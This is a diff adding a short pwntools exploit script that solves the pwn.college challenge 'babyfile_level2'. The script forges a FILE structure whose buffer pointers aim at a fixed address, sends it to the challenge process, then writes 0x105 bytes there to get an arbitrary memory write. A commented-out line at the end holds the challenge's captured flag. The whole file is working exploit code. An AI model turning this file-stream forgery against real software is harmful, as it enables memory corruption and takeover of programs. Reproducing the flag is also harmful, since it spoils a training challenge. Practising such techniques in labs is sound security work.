@@ -1,0 +1,27 @@
+from pwn import *
+
+context.arch = 'amd64'
+
+script = '''
+b *challenge + 195
+'''
+p = process("/challenge/babyfile_level2")
+#p = gdb.debug("./babyfile_level2", script)
+
+payload = p64(0) # flag
+payload += p64(0) # read_ptr
+payload += p64(0) # read_end
+payload += p64(0) # read_base
+payload += p64(0) # write_base
+payload += p64(0) # write_ptr
+payload += p64(0) # write_end
+payload += p64(0x4041f8) # buf_base
+payload += p64(0x4041f8 + 0x105) # buf_end # this shit have to larger than 0x100
+payload += p64(0) * 5
+payload += p64(0) # fileno
+
+p.sendafter(b"Now reading from stdin", payload)
+p.sendafter(b"contents", b"A" * 0x105)
+
+p.interactive()
+#pwn.college{EwitvBb5bOolWmMrwFMyagoxKZG.dFDN0MDL2EzNyYzW}
